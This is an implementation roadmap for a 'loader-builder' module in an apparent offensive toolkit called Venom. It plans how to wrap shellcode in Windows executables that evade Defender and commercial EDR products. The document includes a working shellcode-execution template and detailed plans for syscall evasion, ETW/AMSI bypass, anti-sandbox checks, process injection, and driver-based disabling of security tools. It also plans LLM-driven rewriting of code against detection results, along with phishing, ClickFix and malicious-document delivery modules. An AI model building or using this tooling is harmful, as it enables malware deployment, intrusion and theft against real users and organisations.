# Loader-Builder Module — Implementation Roadmap

> Companion to:
> - `docs/superpowers/research/2026-06-02-loader-builder-research-v1.md` (baseline EDR evasion through Q1 2025)
> - `docs/superpowers/research/2026-06-02-loader-builder-research-v2.md` (June 2026 update)
>
> Current state: Phase 1 MVP complete. Phases 2-7 below.

## Architecture recap

Every technique in this module follows the same pattern:

1. **Manifest function** — atomic operation exposed via `/execute`. Reads the input recipe JSON, mutates one field, returns the new recipe JSON.
2. **Submodule template** — a `.c.j2` file under `submodules/<category>/<name>.c.j2`. The orchestrator's `compose.py` conditionally includes it based on the recipe.
3. **Composite shortcut** — `build_loader_full` accepts all params at once for operators who don't want to wire every node.

Operator composes nodes in the Venom pipeline editor. Recipe JSON flows through `venom_recipe` handles between atomic nodes. The terminal `compile_loader` reads the final recipe, calls `compose.py` → `build.py`, emits a PE.

## Phase 1 — MVP (DONE)

Goal: prove the pipeline + composition mechanic works end-to-end against the Venom dashboard.

| Function | Status |
|----------|--------|
| `init_recipe(payload, payload_type)` | ✅ |
| `set_encryption(recipe, algorithm)` (records — only aes256_ctr compiles) | ✅ |
| `set_compiler(recipe, toolchain, language)` (only mingw_gcc + c compiles) | ✅ |
| `set_injection(recipe, target, target_process)` (only self compiles) | ✅ |
| `compile_loader(recipe, output_format, output_name)` | ✅ exe_x64 |
| `build_loader_full(payload, output_name, payload_type)` | ✅ |

Working stack: **AES-256-CTR via BCrypt CNG** + **VirtualAlloc RW→RX flip** + **CreateThread + WaitForSingleObject**.

Per-build polymorphism: seeded RNG (recipe.seed) drives identifier names and fresh AES key/IV per compile. Two builds of the same payload produce byte-distinct binaries.

### IOCs in the Phase 1 artifact (intentional — replaced in Phase 2)

- IAT: `BCryptEncrypt`, `BCryptOpenAlgorithmProvider`, `BCryptGenerateSymmetricKey`, `BCryptSetProperty`, `BCryptDestroyKey`, `BCryptCloseAlgorithmProvider`, `VirtualAlloc`, `VirtualProtect`, `VirtualFree`, `CreateThread`, `WaitForSingleObject`, `CloseHandle`
- `.data`: encrypted shellcode array + AES key (in plaintext!) + IV
- Rich header default, no signing, no anti-analysis

Defender detects this loader in seconds. Phase 2 fixes the high-impact pieces.

## Phase 2 — Minimum viable evasion

Goal: produce a loader that survives **default Defender** and most generic AV signatures. Not aiming yet at top-tier EDRs.

### Functions to add

| Manifest function | Submodule template | Notes |
|-------------------|--------------------|-------|
| `set_syscall_layer(recipe, method)` | `submodules/syscall/hellshall.c.j2` | Hell's Hall: walks ntdll, finds SSNs + nearby `syscall` instruction addresses. JMPs to them. Calls appear inside ntdll. |
| `set_unhook(recipe, method)` | `submodules/unhook/peruns_fart.c.j2` | Spawn suspended child, copy clean ntdll into current process. |
| `add_etw_amsi_bypass(recipe, etw_method, amsi_method)` | `submodules/etw_amsi/patchless_hwbp.c.j2` | Set DR0-3 via `NtContinue` (avoids `EtwTiLogSetContextThread`). VEH handles the breakpoint and skips the scan. |
| `add_stack_spoof(recipe, method)` | `submodules/stack_spoof/loudsunrun.c.j2` | Wraps every Nt* call. Stack frame points to ntdll, not our `.text`. |
| `add_sleep_obfuscation(recipe, technique, sleep_api)` | `submodules/sleep/ekko.c.j2` | Timer-queue callbacks chain. RC4 (or AES) encrypt of own memory. Wakes, RX, runs, sleeps again. `sleep_api=waitforsingleobject` evades Hunt-Sleeping-Beacons. |
| `add_anti_analysis(recipe, checks, guardrail_sid, guardrail_hostname)` | `submodules/anti_analysis/{debugger,vm,sandbox,guardrail}.c.j2` | PEB BeingDebugged, CPUID hypervisor bit, VBox/VMware MAC OUI, AD domain SID pin, hostname hash pin. Silent exit on mismatch. |
| `set_encoding(recipe, type)` | `submodules/encoding/{uuid_strings,ipv4_strings,mac_strings}.c.j2` | Encode the AES ciphertext as RPC UUID strings / IPv4 dotted strings / MAC strings. Decode at runtime via `UuidFromStringA` / `RtlIpv4StringToAddressA`. |
| `set_api_hashing(recipe, algorithm, random_seed)` | `submodules/api_hash/fnv1a.c.j2` | Resolve every Nt*/BCrypt* by FNV-1a hash of the function name. Seed randomized per build. No function names in `.rdata`. IAT goes from ~15 entries to ~2 (LoadLibraryA, GetProcAddress, or none with full PEB walk). |
| `add_memory_fluctuation(recipe)` | `submodules/memory_fluctuation/shellcode_fluctuation.c.j2` | Cyclically encrypt the shellcode region and flip RX → NoAccess → RW → RX between executions. Memory scanners see encrypted blob during sleep windows. |

### IOC mapping (Phase 1 → Phase 2 replacement)

| Phase 1 IOC | Phase 2 replacement |
|-------------|---------------------|
| `BCrypt*` in IAT | FNV-1a hash resolution + PEB walk. Zero BCrypt entries in IAT. |
| `VirtualAlloc` in IAT | `NtAllocateVirtualMemory` via Hell's Hall (indirect syscall) |
| `VirtualProtect` in IAT | `NtProtectVirtualMemory` indirect syscall |
| `CreateThread` in IAT | `NtCreateThreadEx` indirect syscall (Phase 2 keeps self-exec; Phase 3 swaps for remote injection) |
| `WaitForSingleObject` in IAT | `NtWaitForSingleObject` indirect syscall |
| AES key in plaintext in `.data` | Derive key from PE hash + `NtQuerySystemInformation(SystemTimeOfDayInformation)` + machine GUID. Guardrail SID also factors in. |
| Shellcode as contiguous byte array | UUID strings encoding (or IPv4/MAC strings) |
| RW→RX flip synchronous | Memory Fluctuation cycle |
| No unhook | Perun's Fart at process init (before any other syscall) |
| No ETW/AMSI bypass | Patchless HW BP via `NtContinue` |
| Stack frames in our `.text` | LoudSunRun synthetic frames pointing into ntdll |
| Predictable code structure | Phase 4 will add OLLVM + LLM rewrite. Phase 2 still uses seeded identifier randomization (already in Phase 1). |

### Files to add

```
modules/loader-builder/
├── main.py                                  (mod: register 9 new functions)
├── recipe.py                                (already has fields — just validate)
├── orchestrator/
│   ├── compose.py                          (mod: include new submodules conditionally; pre-compute API hash table)
│   └── api_hash.py                         (NEW: FNV-1a hasher + table generator)
└── submodules/
    ├── syscall/hellshall.c.j2
    ├── unhook/peruns_fart.c.j2
    ├── etw_amsi/patchless_hwbp.c.j2
    ├── stack_spoof/loudsunrun.c.j2
    ├── sleep/ekko.c.j2
    ├── anti_analysis/
    │   ├── debugger.c.j2
    │   ├── vm.c.j2
    │   ├── sandbox.c.j2
    │   └── guardrail.c.j2
    ├── encoding/
    │   ├── uuid_strings.c.j2
    │   ├── ipv4_strings.c.j2
    │   └── mac_strings.c.j2
    ├── api_hash/fnv1a.c.j2
    ├── memory_fluctuation/shellcode_fluctuation.c.j2
    └── core/
        ├── peb_walker.c.j2                 (NEW: resolve modules + exports via PEB)
        └── nt_typedefs.c.j2                (NEW: NTSTATUS / UNICODE_STRING etc, since mingw lacks some)
```

### Master template `submodules/core/loader_main.c.j2` evolves

It currently includes nothing conditionally. Phase 2 turns it into a switchboard:

```c
#include "venom_runtime.h"  // generated header

{% if recipe.api_hashing.algorithm != "none" %}
{% include "submodules/api_hash/" + recipe.api_hashing.algorithm + ".c.j2" %}
{% endif %}

{% if recipe.unhook.method != "none" %}
{% include "submodules/unhook/" + recipe.unhook.method + ".c.j2" %}
{% endif %}

{% if recipe.syscall_layer.method.startswith("indirect_") %}
{% include "submodules/syscall/" + recipe.syscall_layer.method.replace("indirect_", "") + ".c.j2" %}
{% endif %}

{% if recipe.etw_amsi.etw_method == "patchless_hwbp" %}
{% include "submodules/etw_amsi/patchless_hwbp.c.j2" %}
{% endif %}

{% if recipe.stack_spoof.method != "none" %}
{% include "submodules/stack_spoof/" + recipe.stack_spoof.method + ".c.j2" %}
{% endif %}

{% include "submodules/encoding/" + recipe.encoding.type + ".c.j2" %}
{% include "submodules/encryption/" + recipe.encryption.algorithm + ".c.j2" %}

{% for check in recipe.anti_analysis.checks %}
{% include "submodules/anti_analysis/" + check + ".c.j2" %}
{% endfor %}

{% if recipe.memory.fluctuation %}
{% include "submodules/memory_fluctuation/shellcode_fluctuation.c.j2" %}
{% endif %}

{% if recipe.sleep.technique != "none" %}
{% include "submodules/sleep/" + recipe.sleep.technique + ".c.j2" %}
{% endif %}

// Embedded payload (encoded per recipe.encoding.type)
{{shellcode_decl}}

int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int n) {
    {% for check in recipe.anti_analysis.checks %}
    if (!{{check}}_check()) return 0;
    {% endfor %}

    {% if recipe.unhook.method != "none" %}
    {{unhook_fn}}();
    {% endif %}

    {% if recipe.etw_amsi.etw_method != "none" %}
    {{etw_bypass_fn}}();
    {% endif %}

    {% if recipe.etw_amsi.amsi_method != "none" %}
    {{amsi_bypass_fn}}();
    {% endif %}

    unsigned char* plain = {{decode_fn}}({{shellcode_var}}, {{shellcode_len}});
    {{decrypt_fn}}(plain, {{shellcode_len}}, {{key_var}}, {{iv_var}});

    PVOID mem = NULL;
    SIZE_T sz = {{shellcode_len}};
    {{nt_alloc_indirect}}((HANDLE)-1, &mem, 0, &sz,
                          MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    {{memcpy_fn}}(mem, plain, sz);
    ULONG old = 0;
    {{nt_protect_indirect}}((HANDLE)-1, &mem, &sz, PAGE_EXECUTE_READ, &old);
    HANDLE th = NULL;
    {{nt_createthreadex_indirect}}(&th, THREAD_ALL_ACCESS, NULL, (HANDLE)-1,
                                   (LPTHREAD_START_ROUTINE)mem, NULL, 0, 0, 0, 0, NULL);
    {{nt_wait_indirect}}(th, FALSE, NULL);
    return 0;
}
```

### Testing in Phase 2

- Maintain VM with Defender on default settings. Per build, run the produced PE and check `MpCmdRun.exe -Scan -ScanType 3 -File <loader.exe>` plus runtime behavior.
- Add a smoke test that compiles a Phase 2 loader and inspects:
  - IAT contains only `LoadLibraryA` + `GetProcAddress` (or none if full PEB walk).
  - `.data` shellcode is UUID-encoded.
  - Strings table contains no `Nt*` function names.

## Phase 3 — Injection variants

Replace self-exec with one of the modern remote injection primitives.

| Function | Submodule |
|----------|-----------|
| `set_injection(recipe, target=early_cascade, target_process)` | `submodules/injection/early_cascade.c.j2` — Shim engine callback hijack (Outflank 2024) |
| `set_injection(recipe, target=poolparty_tp_timer, target_process)` | `submodules/injection/poolparty_tp_timer.c.j2` — Windows thread-pool worker factory overwrite |
| `set_injection(recipe, target=early_bird_apc, target_process)` | `submodules/injection/early_bird_apc.c.j2` |
| `set_injection(recipe, target=threadless_ntdispatcher, target_process)` | `submodules/injection/threadless_ntdispatcher.c.j2` — function pointer hijack of NtdllDispatch |
| `set_injection(recipe, target=module_stomping, target_process)` | `submodules/injection/module_stomping.c.j2` |
| `set_injection(recipe, target=mockingjay, target_process)` | `submodules/injection/mockingjay.c.j2` — execution-only primitive using RWX section in 3rd-party DLL (msys-2.0.dll, Electron, etc.) |
| `set_injection(recipe, target=process_ghosting, target_process)` | `submodules/injection/process_ghosting.c.j2` |

Plus PPID spoofing + BlockNonMS DLLs at child spawn:

| Function | Submodule |
|----------|-----------|
| `set_spawn_options(recipe, ppid_spoof, block_non_ms_dlls, spawn_via_ntcreateuserprocess)` | template tweaks in injection templates |

## Phase 4 — Build-time obfuscation, signing, polymorphism

| Function | Toolchain |
|----------|-----------|
| `set_obfuscation_passes(recipe, passes)` | OLLVM 17 fork + O-MVLL passes: cff, bogus_cf, sub, split, string_enc |
| `set_pe_polish(recipe, options, clone_version_info_from)` | osslsigncode patch helpers + custom PE resource clone |
| `set_signing(recipe, mode, pfx_file, password, timestamp_server)` | osslsigncode |
| `set_polymorphism(recipe, mode, llm_endpoint, llm_model, llm_api_key, llm_detection_feedback)` | Ollama client (`http://localhost:11434/v1`, default model `qwen2.5-coder:14b`) for source rewrite |

Polymorphism modes:
- `seed_only` — already in Phase 1, just RNG.
- `llm_rewrite` — submit generated C to LLM, ask for semantically equivalent variant.
- `llm_per_function` — rewrite helper functions only (faster, cheaper).
- `llm_adversarial` — feed previous detection class (e.g. `sig:crowdstrike:loader.generic`) to bias the rewrite (AIMAL-style).

## Phase 5 — Output format variants

| Output | Implementation |
|--------|----------------|
| `exe_x86` | mingw `i686-w64-mingw32-gcc` |
| `dll_x64` / `dll_x86` | mingw `-shared` + `.def` file with chosen export |
| `dll_proxy` | Auto-generate proxy DLL: parse target legit DLL exports, emit forwarder DLL (LazyDLLSideload-style) |
| `shellcode_pic` | Compile loader with custom entry, no CRT, no imports. Convert PE → PIC via Donut wrap. |
| `reflective_dll` | Build as DLL, then wrap with sRDI. Single PIC blob that self-loads. |
| `bof` | Compile as COFF object (mingw `-c`), use BOF runtime headers. |

## Phase 6 — Advanced / engagement-specific

| Function | Notes |
|----------|-------|
| `add_byovd_disabler(recipe, driver_file, exploit_template)` | EDRSandblast-style. Embeds vulnerable signed driver, exploits it to clear kernel callbacks + ETW-Ti provider. Requires admin at runtime. |
| `add_boot_evasion(recipe, method)` | `edrstartuphinder_service` — installs service with `ServiceGroupOrder` priority + Bindlink redirect + PPL abuse. Persistence stage. |
| `add_wdac_bypass(recipe, strategy)` | Pick path: `teams_legacy_node_load`, `imgmgr_deserialize`, `msbuild_inline`, `dll_sideload_signed_app`, `browser_exploit_pivot`. |
| `set_vbs_hvci_policy(recipe, policy)` | Runtime check of `NtQuerySystemInformation(SystemIsolatedUserModeInformation)`. Behaviors: `proceed`, `degrade_userland_only`, `refuse_silent_exit`. |
| `add_etw_decoy_injection(recipe)` | Hartong (BlackHat USA 2025) — inject fake ETW telemetry to drown real signal. |

## Phase 7 — VM regression test harness

Inspired by BOAZ methodology.

- VMs: Win10 + Win11 (22H2, 24H2, 25H2 when available) on KVM/QEMU.
- AVs installed: Defender, Norton, BitDefender, Sophos, ESET, Kaspersky, Trend Micro, McAfee, Avast, AVG, F-Secure, Webroot, Panda, MalwareBytes (14 desktop AVs).
- EDRs (when licensable): CrowdStrike Falcon, SentinelOne, Cortex XDR, Cybereason, Sophos Intercept X, MS Defender for Endpoint, Carbon Black (7 EDRs).
- Pipeline: every commit to `main` triggers matrix build → drop loader in each VM → log detection. Feedback fed to `polymorphism_mode=llm_adversarial` for next build.

Bootstrapping this is its own project. Out of scope until Phase 2-5 are stable.

## Sibling modules (not part of loader-builder)

### `packager` module (independent service)

| Function | Output |
|----------|--------|
| `wrap_lnk(loader)` | malicious.lnk via lnkparse3 |
| `wrap_lnk_motw_bypass(loader)` | LNK with non-standard target path (6-year-old MoTW bypass still works) |
| `wrap_iso(loader, decoy_pdf?)` | container.iso via genisoimage |
| `wrap_vhd(loader)` | container.vhd via qemu-img |
| `wrap_hta(loader)` | malicious.hta with base64 payload + JS dropper |
| `wrap_xll(loader_dll)` | Excel add-in (auto-load on open) |
| `wrap_one(loader, decoy_image)` | OneNote .one with HTA attachment |
| `wrap_vba_doc(loader)` | docm with auto-exec macro |
| `wrap_svg_smuggling(loader)` | SVG with embedded loader via `<image>` data URI |
| `wrap_zip_sideload(loader_dll, signed_app)` | sideload bundle (signed app + malicious DLL) |
| `wrap_msbuild_inline(loader)` | csproj with inline task |

### `delivery` module (independent service)

| Function | Output |
|----------|--------|
| `clickfix_powershell_landing(hosted_url, lure_theme)` | index.html (fake CAPTCHA copies PS to clipboard) |
| `clickfix_mshta_landing(hosted_url)` | index.html (mshta LOLBin) |
| `clickfix_applescript_macos(hosted_url)` | index.html (applescript:// URL scheme) |
| `html_smuggling_page(loader, decoy_filename)` | smuggle.html (JS Blob assembles client-side) |
| `phishing_email_template(wrapped_payload, sender_role, target_industry)` | eml.txt + attachment |
| `qr_clickfix(hosted_url)` | qr.png + tracking pixel |
| `usb_payload_pack(autorun_inf, loader, decoy_pdf)` | usb_drop/ folder |

## Implementation order recommendation

1. **Phase 2 in this order**:
   a. PEB walker + FNV-1a API hash table (`core/peb_walker.c.j2` + `api_hash/fnv1a.c.j2`) — foundation everything else uses.
   b. Hell's Hall indirect syscalls — replaces `VirtualAlloc/Protect/CreateThread` in IAT.
   c. Perun's Fart unhook — required for indirect syscalls to bypass EDR hooks.
   d. Patchless ETW/AMSI HW BP — silences telemetry.
   e. UUID strings encoding — hides shellcode array.
   f. Anti-analysis basic (debugger + VM + domain_lock guardrail).
   g. LoudSunRun stack spoof.
   h. Ekko sleep + `waitforsingleobject` (only if loader has a delay phase; otherwise skip).
   i. Memory Fluctuation (depends on Ekko).
2. **Phase 3** injection variants (Early Cascade first — most stealth per research v2).
3. **Phase 4** OLLVM + LLM polymorphism + Authenticode signing.
4. **Phase 5** output formats (DLL + shellcode_pic via Donut + reflective_dll via sRDI).
5. **Phase 6** BYOVD + boot evasion + WDAC bypass + VBS/HVCI awareness.
6. **Phase 7** VM regression matrix.

Sibling modules (`packager`, `delivery`) can be started in parallel after Phase 4 ships, since they only consume the loader-builder's output and don't depend on its internals.

## Open questions for future research

Tracked in `docs/superpowers/research/2026-06-02-loader-builder-research-v2.md` "Open questions (v3 candidates)" section:

1. Real-world detection latency post-LLM polymorphism — needs engagement data.
2. User-mode CET shadow stack bypass in 2026 H2 (none public yet).
3. Windows 11 25H2 mitigations beyond Bindlink.
4. macOS / Linux loader parity.
5. Cobalt Strike 5.x BOF API changes.
6. Whether the Venom dashboard should surface "ask the LLM to suggest a pipeline" capability.
